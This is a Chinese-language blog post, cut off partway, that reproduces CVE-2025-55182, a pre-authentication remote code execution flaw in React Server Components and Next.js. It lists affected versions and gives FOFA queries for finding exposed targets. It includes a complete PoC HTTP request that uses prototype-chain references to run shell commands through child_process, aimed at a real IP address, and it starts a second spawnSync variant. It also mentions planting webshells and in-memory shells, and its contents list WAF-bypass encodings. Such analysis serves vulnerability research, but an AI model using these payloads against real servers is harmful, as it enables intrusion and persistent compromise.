<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="写在最开始React Server Components 19.0.0、19.1.0、19.1.1 和 19.2.0 版本存在预身份验证远程代码执行漏洞，涉及以下软件包：react-server-dom-parcel、react-server-dom-turbopack 和 react-server-dom-webpack。该漏洞利用的代码会不安全地反序列化发送到服务器函数端点的 HTTP 请求的">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2025-55182-Next.js无条件RCE">
<meta property="og:url" content="http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/index.html">
<meta property="og:site_name" content="Meteor_Kai">
<meta property="og:description" content="写在最开始React Server Components 19.0.0、19.1.0、19.1.1 和 19.2.0 版本存在预身份验证远程代码执行漏洞，涉及以下软件包：react-server-dom-parcel、react-server-dom-turbopack 和 react-server-dom-webpack。该漏洞利用的代码会不安全地反序列化发送到服务器函数端点的 HTTP 请求的">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/2.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/3.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/4.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/5.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/43.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/44.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/45.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/6.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/7.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/8.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/9.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/10.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/11.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/46.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/12.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/13.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/14.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/15.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/16.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/17.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/18.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/47.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/19.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/20.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/21.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/22.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/23.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/24.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/25.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/26.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/27.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/28.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/29.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/30.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/31.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/32.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/33.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/48.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/34.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/35.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/36.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/37.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/38.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/39.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/49.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/40.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/50.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/41.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/42.png">
<meta property="article:published_time" content="2025-12-20T02:09:22.000Z">
<meta property="article:modified_time" content="2025-12-20T02:20:06.797Z">
<meta property="article:author" content="Meteor_Kai">
<meta property="article:tag" content="CVE复现">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/2.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>CVE-2025-55182-Next.js无条件RCE</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About me</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/MeteorKai/">Projects</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/categories/">categories</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     --><!--
       --><li><a href="/links/">links</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" aria-label="Next post" href="/2025/12/14/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/&text=CVE-2025-55182-Next.js无条件RCE"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/&title=CVE-2025-55182-Next.js无条件RCE"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/&is_video=false&description=CVE-2025-55182-Next.js无条件RCE"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=CVE-2025-55182-Next.js无条件RCE&body=Check out this article: http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/&title=CVE-2025-55182-Next.js无条件RCE"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/&title=CVE-2025-55182-Next.js无条件RCE"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/&title=CVE-2025-55182-Next.js无条件RCE"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/&title=CVE-2025-55182-Next.js无条件RCE"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/&name=CVE-2025-55182-Next.js无条件RCE&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/&t=CVE-2025-55182-Next.js无条件RCE"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E6%9C%80%E5%BC%80%E5%A7%8B"><span class="toc-number">1.</span> <span class="toc-text">写在最开始</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">2.</span> <span class="toc-text">前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9E%E8%B0%83%E5%9C%B0%E7%8B%B1"><span class="toc-number">2.1.</span> <span class="toc-text">回调地狱</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Promise"><span class="toc-number">2.2.</span> <span class="toc-text">Promise</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E8%AE%BE%E8%AE%A1Promise%E5%AF%B9%E8%B1%A1"><span class="toc-number">2.3.</span> <span class="toc-text">如何设计Promise对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#async%E5%92%8Cawait%E5%BC%82%E6%AD%A5"><span class="toc-number">2.4.</span> <span class="toc-text">async和await异步</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Thenable%E7%9A%84%E7%94%B1%E6%9D%A5"><span class="toc-number">2.5.</span> <span class="toc-text">Thenable的由来</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E5%BE%97%E5%BF%85%E6%9C%89%E5%A4%B1"><span class="toc-number">2.6.</span> <span class="toc-text">有得必有失</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%80%E5%A7%8B%E8%B0%83%E8%AF%95"><span class="toc-number">3.</span> <span class="toc-text">开始调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RSC%E6%98%AF%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90%E6%95%B0%E6%8D%AE%E5%8C%85%E7%9A%84"><span class="toc-number">4.</span> <span class="toc-text">RSC是如何解析数据包的</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSR-RSC"><span class="toc-number">4.1.</span> <span class="toc-text">SSR &amp; RSC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Server-Actions-Flight%E5%8D%8F%E8%AE%AE"><span class="toc-number">4.2.</span> <span class="toc-text">Server Actions &amp; Flight协议</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">5.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91%E6%B5%81%E7%A8%8B"><span class="toc-number">6.</span> <span class="toc-text">漏洞触发流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E4%BA%9BWAF"><span class="toc-number">7.</span> <span class="toc-text">一些WAF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#base64-bypass"><span class="toc-number">7.1.</span> <span class="toc-text">base64 bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unicode-bypass"><span class="toc-number">7.2.</span> <span class="toc-text">unicode bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#utf16-encoding"><span class="toc-number">7.3.</span> <span class="toc-text">utf16 encoding</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#badcase-base64-encoding"><span class="toc-number">7.4.</span> <span class="toc-text">badcase: base64 encoding</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">8.</span> <span class="toc-text">参考文章</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        CVE-2025-55182-Next.js无条件RCE
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">Meteor_Kai</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-12-20T02:09:22.000Z" class="dt-published" itemprop="datePublished">2025-12-20</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/CVE%E5%A4%8D%E7%8E%B0/">CVE复现</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/CVE%E5%A4%8D%E7%8E%B0/" rel="tag">CVE复现</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="写在最开始"><a href="#写在最开始" class="headerlink" title="写在最开始"></a>写在最开始</h2><p>React Server Components 19.0.0、19.1.0、19.1.1 和 19.2.0 版本存在预身份验证远程代码执行漏洞，涉及以下软件包：react-server-dom-parcel、react-server-dom-turbopack 和 react-server-dom-webpack。该漏洞利用的代码会不安全地反序列化发送到服务器函数端点的 HTTP 请求的有效负载。</p>
<p>受影响组件：</p>
<ul>
<li>react-server-dom-webpack（React Server Components 的一部分）使用该库的框架，如Next.js 15.x &#x2F; 16.x（App Router 模式）</li>
</ul>
<p>影响版本：</p>
<ul>
<li><p>react-server-dom-webpack:19.0.0,19.1.0,19.1.1,19.2.0</p>
</li>
<li><p>Next.js版本：15.x系列（所有版本）、16.x系列（所有版本）、14.3.0-canary.77及后续canary版本。</p>
<p>条件：必须同时使用React Server Components和App Router模式，Pages Router模式不受影响。</p>
</li>
</ul>
<p>是否必须要POST请求：✅ </p>
<p>是否必须有Next-Action头：✅ </p>
<p>是否必须是Multipart请求：✅ </p>
<p>是否可以落地webshell：如果是dev模式，可以直接写入webshell并且不需要重启就可以加载；如果是生产环境，写入的webshell需要重启；但如果黑客直接写入.next目录下未加载的模块，有可能可以做到无需重启。 </p>
<p>是否可以写入内存马：✅</p>
<p>CVE-2025-55182 是 React Server Components（版本 19.0.0 至 19.2.0）中的一个高危预认证远程代码执行漏洞，源于服务端在反序列化 Server Action 请求时未校验模块导出属性的合法性，攻击者可通过操控请求负载访问原型链上的危险方法（如 vm.runInThisContext），进而执行任意系统命令，只要应用依赖中包含 vm、child_process 或 fs 等常见 Node.js 模块即可被利用。</p>
<p><strong>fofa：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app=&quot;Next.js&quot; &amp;&amp; body=&quot;/_next/static/chunks/app/&quot;</span><br><span class="line"></span><br><span class="line">body=&quot;react.production.min.js&quot; || body=&quot;React.createElement(&quot; || app=&quot;React.js&quot; || app=&quot;Dify&quot;</span><br></pre></td></tr></table></figure>



<p>这里给出poc：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST /app HTTP/1.1</span><br><span class="line">Host: 124.220.97.61</span><br><span class="line">Next-Action: x</span><br><span class="line">X-Nextjs-Request-Id: b5dce965</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad</span><br><span class="line">X-Nextjs-Html-Request-Id: SSTMXm7OJ_g0Ncx6jpQt9</span><br><span class="line">Content-Length: 565</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryx8jO2oVc6SWP3Sad</span><br><span class="line">Content-Disposition: form-data; name=&quot;0&quot;</span><br><span class="line"></span><br><span class="line">&#123;&quot;then&quot;:&quot;$1:__proto__:then&quot;,&quot;status&quot;:&quot;resolved_model&quot;,&quot;reason&quot;:-1,&quot;value&quot;:&quot;&#123;\&quot;then\&quot;:\&quot;$B1337\&quot;&#125;&quot;,&quot;_response&quot;:&#123;&quot;_prefix&quot;:&quot;var res=process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;).toString().trim();;throw Object.assign(new Error(&#x27;NEXT_REDIRECT&#x27;),&#123;digest: `NEXT_REDIRECT;push;/login?a=$&#123;res&#125;;307;`&#125;);&quot;,&quot;_chunks&quot;:&quot;$Q2&quot;,&quot;_formData&quot;:&#123;&quot;get&quot;:&quot;$1:constructor:constructor&quot;&#125;&#125;&#125;</span><br><span class="line">------WebKitFormBoundaryx8jO2oVc6SWP3Sad</span><br><span class="line">Content-Disposition: form-data; name=&quot;1&quot;</span><br><span class="line"></span><br><span class="line">&quot;$@0&quot;</span><br><span class="line">------WebKitFormBoundaryx8jO2oVc6SWP3Sad</span><br><span class="line">Content-Disposition: form-data; name=&quot;2&quot;</span><br><span class="line"></span><br><span class="line">[]</span><br><span class="line">------WebKitFormBoundaryx8jO2oVc6SWP3Sad--</span><br></pre></td></tr></table></figure>

<p>在典型的 Server Action 请求中，Next.js &#x2F; React 发送 <code>multipart/form-data</code> 请求，表单字段结构如下：</p>
<ul>
<li><code>name=&quot;0&quot;</code>: 主 payload（如参数列表）</li>
<li><code>name=&quot;1&quot;</code>: 第 1 个模型块（model chunk）</li>
<li><code>name=&quot;2&quot;</code>: 第 2 个模型块</li>
<li><code>...</code> : 更多块</li>
</ul>
<p><code>$N</code> 引用语法</p>
<p>Flight 协议使用 <code>$</code> 前缀加数字表示对特定 chunk 的引用，冒号分隔的路径用于访问嵌套属性：</p>
<ul>
<li><code>&quot;$1&quot;</code>: 引用 chunk1 本身</li>
<li><code>&quot;$2:fruitName&quot;</code>: 引用 chunk2 解析后对象的 <code>fruitName</code> 属性</li>
<li><code>&quot;$3:user:email&quot;</code>: 引用 chunk3 中的 <code>.user.email</code></li>
</ul>
<p>假设客户端发送如下请求：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundaryABC123</span><br><span class="line">Content-Disposition: form-data; name=&quot;0&quot;</span><br><span class="line"></span><br><span class="line">[&quot;$1:profile:name&quot;]</span><br><span class="line">------WebKitFormBoundaryABC123</span><br><span class="line">Content-Disposition: form-data; name=&quot;1&quot;</span><br><span class="line"></span><br><span class="line">&#123;&quot;profile&quot;:&#123;&quot;name&quot;:&quot;alice&quot;,&quot;age&quot;:18&#125;&#125;</span><br><span class="line">------WebKitFormBoundaryABC123--</span><br></pre></td></tr></table></figure>

<p>其实可以看做：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chunks = &#123;</span><br><span class="line">  &quot;0&quot;: &#x27;[&quot;$1:profile:name&quot;]&#x27;,</span><br><span class="line">  &quot;1&quot;: &#x27;&#123;&quot;profile&quot;:&#123;&quot;name&quot;:&quot;alice&quot;,&quot;age&quot;:18&#125;&#125;&#x27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>解析过程如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;$1:profile:name&quot;</span><br><span class="line">  → 查找 chunk1 并解析：&#123;&quot;profile&quot;:&#123;&quot;name&quot;:&quot;alice&quot;,&quot;age&quot;:18&#125;&#125;</span><br><span class="line">  → 访问路径 .profile.name</span><br><span class="line">  → 返回 &quot;alice&quot;</span><br></pre></td></tr></table></figure>



<p>这里先大致分析一下POC，<code>$1:__proto__:then</code>其实就是<code>chunk:__proto__:then</code></p>
<p>但是上面这种payload会有长度限制</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST /app HTTP/1.1</span><br><span class="line">Host: 124.220.97.61</span><br><span class="line">Next-Action: x</span><br><span class="line">X-Nextjs-Request-Id: b5dce965</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad</span><br><span class="line">X-Nextjs-Html-Request-Id: SSTMXm7OJ_g0Ncx6jpQt9</span><br><span class="line">Content-Length: 565</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryx8jO2oVc6SWP3Sad</span><br><span class="line">Content-Disposition: form-data; name=&quot;0&quot;</span><br><span class="line"></span><br><span class="line">&#123;&quot;then&quot;:&quot;$1:__proto__:then&quot;,&quot;status&quot;:&quot;resolved_model&quot;,&quot;reason&quot;:-1,&quot;value&quot;:&quot;&#123;\&quot;then\&quot;:\&quot;$B1337\&quot;&#125;&quot;,&quot;_response&quot;:&#123;&quot;_prefix&quot;:&quot;var r=process.mainModule.require(&#x27;child_process&#x27;).spawnSync(&#x27;sh&#x27;,[&#x27;-c&#x27;,&#x27;ls 